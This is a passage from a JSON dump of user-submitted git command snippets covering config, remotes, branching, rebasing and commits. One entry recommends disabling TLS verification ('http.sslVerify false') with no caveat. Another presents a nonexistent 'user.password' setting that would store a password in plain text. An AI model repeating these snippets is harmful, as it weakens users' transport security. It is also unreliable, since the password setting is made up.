\ngit commit --amend // press enter, editor would open\nStep1: git rebase -i HEAD~n to do interactive rebase for the last n commits affected. (i.e. if you want to change a commit message 3 commits back, do git rebase -i HEAD~3)  git will pop up an editor to handle those commits, notice this command:  #  r, reword = use commit, but edit the commit message that is exactly we need!  Step2: Change pick to r for those commits that you want to update the message. Don't bother changing the commit message here, it will be ignored. You'll do that on the next step. Save and close the editor.  Note that if you edit your rebase 'plan' yet it doesn't begin the process of letting you rename the files, run:  git rebase --continue If you want to change the text editor used for the interactive session Step3: Git will pop up another editor for every revision you put r before. Update the commit msg as you like, then save and close the editor.  Step4: After all commits msgs are updated. you might want to do git push -f to update the remote.\n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1703,
    "keyword": null,
    "link": null,
    "title": " git change default editor",
    "description": "git config --global core.editor vim\n$ git config --global core.editor vim\ngit config --global core.editor \"/bin/nano\"\n# Set Emacs as the default editor $ git config --global core.editor emacs    # Set Visual Studio Code as the default editor $ git config --global core.editor code\ngit config --global core.editor nano\n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1704,
    "keyword": null,
    "link": null,
    "title": " git change email",
    "description": "# FOR ALL REPOS ## change username git config --global user.name \"John Doe\" ## change email address git config --global user.email \"johndoe@example.com\"  # FOR CURRENT-DIRECTORY REPO ONLY ## change username git config user.name \"John Doe\" ## change email address git config user.email \"johndoe@example.com\"\n$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config --global user.name \"My Name\"\ngit config --global user.email \"your_email@abc.com\" \n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1705,
    "keyword": null,
    "link": null,
    "title": " git change https to ssh",
    "description": "# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote remove origin && git remote add origin git@github.com\n$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git\ngit remote add origin git@github.com:nikhilbhardwaj/abc.git\ngit remote add origin <git_url>\n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1706,
    "keyword": null,
    "link": null,
    "title": " git change master to main",
    "description": "$ git branch -m master main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git branch -m master main  or create a new one  $ git checkout -b main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git push -u origin main \n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1707,
    "keyword": null,
    "link": null,
    "title": " git change multiple comments",
    "description": "Update the author details of historical commits Firstly, we'll need to update the commit author in our local Git config:  $ git config --global user.name \"Robert Lyall\" $ git config --global user.email \"rob@deployhq.com\" Then, reset the author of all commits after a specific commit:  $ git rebase -i 956951bf -x \"git commit --amend --reset-author -CHEAD\" You'll then be presented with your editor where you can confirm all the commits you want to change.  pick bef03ed Revert \"Add the correct link to Brie\" exec git commit --ammend --reset-author -CHEAD pick 74dd8b3 New folder exec git commit --ammend --reset-author -CHEAD pick 56aedbe remove old folder exec git commit --ammend --reset-author -CHEAD  # Rebase 956951b..56aedbe onto 956951b (6 commands) # # Commands: # p, pick <commit> = use commit # r, reword <commit> = use commit, but edit the commit message # e, edit <commit> = use commit, but stop for amending # s, squash <commit> = use commit, but meld into previous commit # f, fixup <commit> = like \"squash\", but discard this commit's log message # x, exec <command> = run command (the rest of the line) using shell # b, break = stop here (continue rebase later with 'git rebase --continue') # d, drop <commit> = remove commit # l, label <label> = label current HEAD with a name # t, reset <label> = reset HEAD to a label Check through the commits in the list, and hit ctrl+x, followed by enter to apply the changes.\n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1708,
    "keyword": null,
    "link": null,
    "title": " git change origin",
    "description": "git remote set-url origin new.git.url/here\n git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\n$ git remote -v > origin  https://github.com/USERNAME/REPOSITORY.git (fetch) > origin  https://github.com/USERNAME/REPOSITORY.git (push)  Change your remote\\'s URL from HTTPS to SSH with the git remote set-url command. $ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git  Verify that the remote URL has changed. $ git remote -v # Verify new remote URL > origin  git@github.com:USERNAME/REPOSITORY.git (fetch) > origin  git@github.com:USERNAME/REPOSITORY.git (push)\n",
    "reg_date": "2021-10-11T22:04:58.000Z"
  },
  {
    "id": 1709,
    "keyword": null,
    "link": null,
    "title": " git change personal token to login and passowrd",
    "description": "git remote remove origin git remote add origin https://<USERNAME>@github.com/<USERNAME>/<REPO>.git\n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1710,
    "keyword": null,
    "link": null,
    "title": " git change remote origin",
    "description": "git remote set-url origin new.git.url/here\n# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1711,
    "keyword": null,
    "link": null,
    "title": " git change username email",
    "description": "# FOR ALL REPOS ## change username git config --global user.name \"John Doe\" ## change email address git config --global user.email \"johndoe@example.com\"  # FOR CURRENT-DIRECTORY REPO ONLY ## change username git config user.name \"John Doe\" ## change email address git config user.email \"johndoe@example.com\"\ngit config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\ngit config --global user.email \"your_email@abc.com\" \n$ git config --global user.email \"email@example.com\"\n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1712,
    "keyword": null,
    "link": null,
    "title": " git changing folder name to upperrcase",
    "description": "git config core.ignorecase false\n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1713,
    "keyword": null,
    "link": null,
    "title": " git check first commit",
    "description": "git rev-list --max-parents=0 HEAD \n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1714,
    "keyword": null,
    "link": null,
    "title": " git check ignore",
    "description": "# Check that a file/folder is ignored git check-ignore * # Check that a file/folder is ignored and which line of .gitignore causes that git check-ignore -v * \n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1715,
    "keyword": null,
    "link": null,
    "title": " git check upstream",
    "description": "git remote show origin\n$ git branch -vv   main   aaf02f0 [main/master: ahead 25] Some other commit * master add0a03 [jdsumsion/master] Some commit \ngit status -sb\n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1716,
    "keyword": null,
    "link": null,
    "title": " git check upstream url",
    "description": "git config --get remote.origin.url\ngit remote show origin \n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1717,
    "keyword": null,
    "link": null,
    "title": " git check which files are committed",
    "description": "$ git diff-tree --no-commit-id --name-only -r bd61ad98 index.html javascript/application.js javascript/ie6.js \ngit diff --name-only HEAD HEAD~1\n$ git show --pretty=\"\" --name-only bd61ad98     index.html javascript/application.js javascript/ie6.js \n",
    "reg_date": "2021-10-11T22:04:59.000Z"
  },
  {
    "id": 1718,
    "keyword": null,
    "link": null,
    "title": " git checkout branch on different remote",
    "description": "# First fetch all new_remote refs git fetch new_remote # Then git checkout -b <branchname> --track new_remote/<branchname>\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1719,
    "keyword": null,
    "link": null,
    "title": " git checkout file as different name",
    "description": "# Checkout File from previous Commit git show HEAD^:your-file > a-different-name-for-your-file git show a-previous-commit-sha^:your-file > a-different-name-for-your-file  git show remotes/origin/master^:your-file > a-different-name-for-your-file git show remotes/origin/a-branch-name^:your-file > a-different-name-for-your-file\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1720,
    "keyword": null,
    "link": null,
    "title": " git checkout file from master",
    "description": "git checkout origin/master -- path/to/file\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1721,
    "keyword": null,
    "link": null,
    "title": " git checkout new branch",
    "description": "//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n// create and checkout new branch in one line git checkout -b new_branch\n$ git checkout -b <branch_name> \n$ git checkout -b [name_of_your_new_branch]\n# Create New Branch And Switch To It $ git checkout -b myBranchName\ngit checkout -b topic/newbranch\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1722,
    "keyword": null,
    "link": null,
    "title": " git checkout tag",
    "description": "$ git checkout tags/<tag_name> -b <branch_name> \n$ git checkout tags/v1.0 -b v1.0-branch  Switched to a new branch 'v1.0-branch'\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1723,
    "keyword": null,
    "link": null,
    "title": " git clean",
    "description": "//Remove untracked files git clean -f  //Remove untracked directories and files git clean -fd  //Remove untracked ignored files git clean -fX  //Remove all untracked files  git clean -fx\n//Remove untracked files directories and ignored files git clean -fdx\ngit remote prune origin\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1724,
    "keyword": null,
    "link": null,
    "title": " git clean cache",
    "description": "$ git rm -r --cached .\ngit rm -r --cached <name-of-dir>\n$ git rm --cached filename\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1725,
    "keyword": null,
    "link": null,
    "title": " git clean local remote branch",
    "description": "git fetch origin --prune\ngit branch --merged master | grep -v '^[ *]*master$' | xargs git branch -d \n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1726,
    "keyword": null,
    "link": null,
    "title": " git clear commits",
    "description": "git reset --hard origin\n",
    "reg_date": "2021-10-11T22:05:00.000Z"
  },
  {
    "id": 1727,
    "keyword": null,
    "link": null,
    "title": " git clone --recurse-submodules",
    "description": "git clone --recurse-submodules git://github.com/foo/bar.git \ngit clone --recurse-submodules\n# This will clone a repo with all submodules included git clone --recurse-submodules\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1728,
    "keyword": null,
    "link": null,
    "title": " git clone branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \ngit clone -b branchName repoUrl\ngit clone --single-branch --branch master https://github.com/career-karma-tutorials/ck-git\ngit clone -b <your_branchname> <your_git-remote-repo>\ngit clone -b mybranch --single-branch git://sub.domain.com/repo.git\ngit clone -b <branch> <remote_repo> git clone -b my-branch git@github.com:user/myproject.git\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1729,
    "keyword": null,
    "link": null,
    "title": " git clone different name",
    "description": "git clone https://github.com/sferik/sign-in-with-twitter.git signin \ngit clone https://github.com/sferik/sign-in-with-twitter.git signin\nWith same Git Repository name git clone git@github.com:whatever folder-name  With Different Git Repository name git clone https://github.com/sferik/sign-in-with-twitter.git signin\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1730,
    "keyword": null,
    "link": null,
    "title": " git clone from master",
    "description": "git clone --branch <branchname> <remote-repo-url>\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1731,
    "keyword": null,
    "link": null,
    "title": " git clone from specific branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \nIn general:  git clone -b <branch> <remote_repo>  Example:  git clone -b develop git@github.com:user/myproject.git\ngit clone -b <branchName> <remote_repo_url>\ngit clone -b branchName repoUrl\ngit clone --single-branch --branch master https://github.com/career-karma-tutorials/ck-git\ngit clone -b <your_branchname> <your_git-remote-repo>\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1732,
    "keyword": null,
    "link": null,
    "title": " git clone protical https is not supported",
    "description": "If you tried to paste your link with Ctrl + V Your terminal might have added a hidden \"?\"  When you saw nothing, you may have tried right-click + paste. Unfortunately, this keeps the hidden \"?\" so it is invalid. You may be able to see and/or remove the hidden character by backspacing or just typing it out from scratch (up arrow brings back the hidden character.)\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1733,
    "keyword": null,
    "link": null,
    "title": " git clone recursive",
    "description": "# When cloning repo ... git clone --recurse-submodules -j8 https://git.example.com/repo.git  # ... or for existing already cloned repo git submodule update --init --recursive\ngit submodule update --init --recursive\ngit clone --recurse-submodules\n#! Fetch and update submodules into an existing project git submodule update --init --recursive\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1734,
    "keyword": null,
    "link": null,
    "title": " git command show current repo",
    "description": "git remote get-url origin\n",
    "reg_date": "2021-10-11T22:05:01.000Z"
  },
  {
    "id": 1735,
    "keyword": null,
    "link": null,
    "title": " git command to add execute permission",
    "description": "git update-index --chmod=+x foo.sh\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1736,
    "keyword": null,
    "link": null,
    "title": " git command to create a branch",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n# Create New Branch And Switch To It $ git checkout -b myBranchName\nHow to create a new branch in git   $ git checkout -b good  here good is new branch name the line 3 after executing we will go to that branch\n// create and checkout new branch  git checkout -b new_branch\n$ git checkout -b [your_branch_name] # Switched to a new branch [your_branch_name]  # This is shorthand for: $ git branch [your_branch_name] $ git checkout [your_branch_name]\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1737,
    "keyword": null,
    "link": null,
    "title": " git command to get the repo url",
    "description": "# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote show origin \n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1738,
    "keyword": null,
    "link": null,
    "title": " git commit --amend choose editor",
    "description": "git config --global core.editor \"/bin/nano\"\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1739,
    "keyword": null,
    "link": null,
    "title": " git commit all",
    "description": "git commit -a -m \"Change titles and styling on homepage\"\n#Add all files which have been modified (including tracked and untracked) git add -A #Commit changes with a message git commit -m \"some message\" \ngit commit -a\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1740,
    "keyword": null,
    "link": null,
    "title": " git commit all changes",
    "description": "#Add all files which have been modified (including tracked and untracked) git add -A #Commit changes with a message git commit -m \"some message\" \n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1741,
    "keyword": null,
    "link": null,
    "title": " git commit amend",
    "description": "$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\ngit commit --amend --no-edit\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend \ngit commit --amend -m \"an updated commit message\" \n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1742,
    "keyword": null,
    "link": null,
    "title": " git commit amend without changing message",
    "description": "git commit --amend -m \"New commit message\"\ngit commit --amend --no-edit\n# Move the current head so that it's pointing at the old commit # Leave the index intact for redoing the commit. # HEAD@{1} gives you \"the commit that HEAD pointed at before  # it was moved to where it currently points at\". Note that this is # different from HEAD~1, which gives you \"the commit that is the # parent node of the commit that HEAD is currently pointing to.\" git reset --soft HEAD@{1}  # commit the current tree using the commit details of the previous # HEAD commit. (Note that HEAD@{1} is pointing somewhere different from the # previous command. It's now pointing at the erroneously amended commit.) git commit -C HEAD@{1}\n$ (some_branch) git commit --amend\ngit commit --amend -m \"New commit message for most recent commit\"\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1743,
    "keyword": null,
    "link": null,
    "title": " git commit and push command",
    "description": "1. git init  2. git add .  3. git status  4. git commit -m 'your message'  5. git remote add origin 'your_url_name'   6. git push -u origin master //then login w/ your creds\ngit:    git add .    git commit -m \"$m\"    git push -u origin master \ngit remote add origin https://github.com/tqisjim/google-oauth.git git push -u origin master\n$ git commit -m \"Add existing file\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.\ngit push -u githubrepo master\ngit add . # Adds the file to your local repository and stages it for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.\n",
    "reg_date": "2021-10-11T22:05:02.000Z"
  },
  {
    "id": 1744,
    "keyword": null,
    "link": null,
    "title": " git commit change message after push",
    "description": "git commit --amend -m \"New commit message\" Then git push --force and you're done\ngit push --force <repository> <branch> \n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1745,
    "keyword": null,
    "link": null,
    "title": " git commit current changes to existing branch",
    "description": "git stash git checkout other-branch git stash pop \n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1746,
    "keyword": null,
    "link": null,
    "title": " git commit from terminal",
    "description": "git add index.html css/styles.css git commit -m \"Change titles and styling on homepage\" \ngit commit -a -m \"The Commit message\"\ngit commit -a\n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1747,
    "keyword": null,
    "link": null,
    "title": " git commit messages",
    "description": "git commit -m \"Title\" -m \"Content\"\nAllowed <type> values: # feat (new feature for the user, not a new feature for build script) fix (bug fix for the user, not a fix to a build script) docs (changes to the documentation) style (formatting, missing semi colons, etc; no production code change) refactor (refactoring production code, eg. renaming a variable) test (adding missing tests, refactoring tests; no production code change) chore (updating grunt tasks etc; no production code change)\n$ git commit -m\"Fix typo in introduction to user guide\" \ngit commit -m\"message\"\ngit commit -m <msg>  git commit -message=<msg> \n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1748,
    "keyword": null,
    "link": null,
    "title": " git commit number of lines changed",
    "description": "git log --shortstat\n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1749,
    "keyword": null,
    "link": null,
    "title": " git commit permission changes",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1750,
    "keyword": null,
    "link": null,
    "title": " git commit please tell me who you are",
    "description": "1.git init 2.git config user.name \"someone\" 3.git config user.email \"someone@someplace.com\" 4.git add * 5.git commit -m \"some init msg\" \n",
    "reg_date": "2021-10-11T22:05:03.000Z"
  },
  {
    "id": 1751,
    "keyword": null,
    "link": null,
    "title": " git commits by author",
    "description": "# commits by author git shortlog -s --author=\"authorName\" # for all authors git shortlog -sn --all\ngit log --author=\"Jon\" \n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1752,
    "keyword": null,
    "link": null,
    "title": " git config",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n$ git config --global core.editor vim\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n$ git config --list --show-origin\nEdit: \tgit config -e <optional:--gloabl.--local>     git config remote.origin.url git@github.com:user/repo.git Show: \tgit config -l <optional:--show-origin> \t\t\t\t\t\t\t\t└&mdash;Show ALL with config level & location (system>global>repo-higher lvl overrides lower)  Level Specific 1. System level (applied to every user on the system and all their repositories)   to view:       git config --list --system (may need sudo)   to set:       git config --system color.ui true   to edit system config file:       git config --edit --system 2. Global level (values specific personally to you, the user).   to view:       git config --list --global   to set:       git config --global user.name xyz   to edit global config file:       git config --edit --global 3. Repository level (specific to that single repository)   to view:       git config --list --local   to set:       git config --local core.ignorecase true (--local optional)   to edit repository config file:       git config --edit --local (--local optional)\nOpen the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\"\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1753,
    "keyword": null,
    "link": null,
    "title": " git config --system core.longpaths true",
    "description": "git config --system core.longpaths true \n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1754,
    "keyword": null,
    "link": null,
    "title": " git config all users",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n$ git config --get-all user.name or  $ git config --list\ngit config --global --list\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n$ git config --local user.name \"John Doe\" $ git config --local user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1755,
    "keyword": null,
    "link": null,
    "title": " git config global",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config --global user.name \"My Name\"\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n$ git config --list --show-origin\nEdit: \tgit config -e <optional:--gloabl.--local>     git config remote.origin.url git@github.com:user/repo.git Show: \tgit config -l <optional:--show-origin> \t\t\t\t\t\t\t\t└&mdash;Show ALL with config level & location (system>global>repo-higher lvl overrides lower)  Level Specific 1. System level (applied to every user on the system and all their repositories)   to view:       git config --list --system (may need sudo)   to set:       git config --system color.ui true   to edit system config file:       git config --edit --system 2. Global level (values specific personally to you, the user).   to view:       git config --list --global   to set:       git config --global user.name xyz   to edit global config file:       git config --edit --global 3. Repository level (specific to that single repository)   to view:       git config --list --local   to set:       git config --local core.ignorecase true (--local optional)   to edit repository config file:       git config --edit --local (--local optional)\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1756,
    "keyword": null,
    "link": null,
    "title": " git config global username",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\n$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\ngit config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n$ git config --global user.name \"Mona Lisa\"\n$ git config --local user.name \"John Doe\" $ git config --local user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1757,
    "keyword": null,
    "link": null,
    "title": " git config list",
    "description": "git config --list # or git config --global --list\ngit config --global --list\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\ngit config --list \n$ git config --global -l user.name=edem user.email=edem@gmail.com \n$ git config --list user.name=John Doe user.email=johndoe@example.com color.status=auto color.branch=auto color.interactive=auto color.diff=auto ...\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1758,
    "keyword": null,
    "link": null,
    "title": " git config location",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\nTo track down the file holding each config option set on your own system:   git config --list --show-origin  Generally, there are three configs:   * git config puts stuff in <repo root>/.git/config by default   * git config --global puts stuff in <user home>/.gitconfig     * On Linux/macOS, this means ~/.gitconfig     * On Windows, this means %HOMEDRIVE%%HOMEPATH%\\.gitconfig       (not %USERPROFILE%\\.gitconfig; these are not always the same)   * git config --system puts stuff in a global config file shared by all users     * On Linux, it's /etc/gitconfig     * On macOS, it's /Applications/Xcode.app/Contents/Developer/usr/etc/gitconfig     * On Windows, it's <wherever you installed Git>/etc/gitconfig\n",
    "reg_date": "2021-10-11T22:05:04.000Z"
  },
  {
    "id": 1759,
    "keyword": null,
    "link": null,
    "title": " git config remote.origin.url",
    "description": "# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\ngit remote -v # View existing remotes # origin  https://github.com/user/repo.git (fetch) # origin  https://github.com/user/repo.git (push)  git remote set-url origin https://github.com/user/repo2.git # Change the 'origin' remote's URL  git remote -v # Verify new remote URL # origin  https://github.com/user/repo2.git (fetch) # origin  https://github.com/user/repo2.git (push) \ngit remote set-url origin new.git.url/here \ngit remote add origin git@github.com:nikhilbhardwaj/abc.git\ngit remote add origin <git_url>\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1760,
    "keyword": null,
    "link": null,
    "title": " git config setting",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n$ git config --local user.name \"John Doe\" $ git config --local user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1761,
    "keyword": null,
    "link": null,
    "title": " git config ssl verify false",
    "description": "git config http.sslVerify false \ngit config http.sslVerify \"false\" \n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1762,
    "keyword": null,
    "link": null,
    "title": " git config user",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\ngit config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\n$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config --global user.name \"My Name\"\ngit config --global user.name \"John Doe\" git config --global user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1763,
    "keyword": null,
    "link": null,
    "title": " git config username",
    "description": "git config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\n$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config user.name git config user.email\ngit config --global user.name \"Ivan Yastrebov\" git config --global user.email easy.quest@mail.ru\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1764,
    "keyword": null,
    "link": null,
    "title": " git config username and password global",
    "description": "git config --global user.name \"fname lname\" git config --global user.email \"example@gmail.com\" git config --global user.password \"secret\"\nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\n$ git config --list --show-origin\n$ git config --global user.name \"Mona Lisa\"\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1765,
    "keyword": null,
    "link": null,
    "title": " git crdencial --cache",
    "description": "# Set the time to remember your credentials for (in seconds). The command below sets it to 10 minutes. $ git config --global credential.helper 'cache --timeout=600' \n# Set the time to remember your credentials for (in seconds). The command below sets it to 10 minutes. $ git config --global credential.helper 'cache --timeout=600'\n",
    "reg_date": "2021-10-11T22:05:05.000Z"
  },
  {
    "id": 1766,
    "keyword": null,
    "link": null,
    "title": " git create and checkout branch",
    "description": "//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n// create and checkout new branch in one line git checkout -b new_branch\n$ git checkout -b <branch_name> \n$ git checkout -b myfeature dev \n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1767,
    "keyword": null,
    "link": null,
    "title": " git create branch",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n$ git checkout -b [name_of_your_new_branch]\n$ git branch iss53 $ git checkout iss53\n$ vim index.html $ git commit -a -m 'Create new footer [issue 53]'\ngit branch <branch>\n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1768,
    "keyword": null,
    "link": null,
    "title": " git create branch from tag",
    "description": "git checkout -b newbranch v1.0 \n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1769,
    "keyword": null,
    "link": null,
    "title": " git create empty branch",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\ngit checkout --orphan <branchname> git rm --cached -r .\n// create and checkout new branch in one line git checkout -b new_branch\ngit checkout --orphan empty-branch\n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1770,
    "keyword": null,
    "link": null,
    "title": " git create new branch",
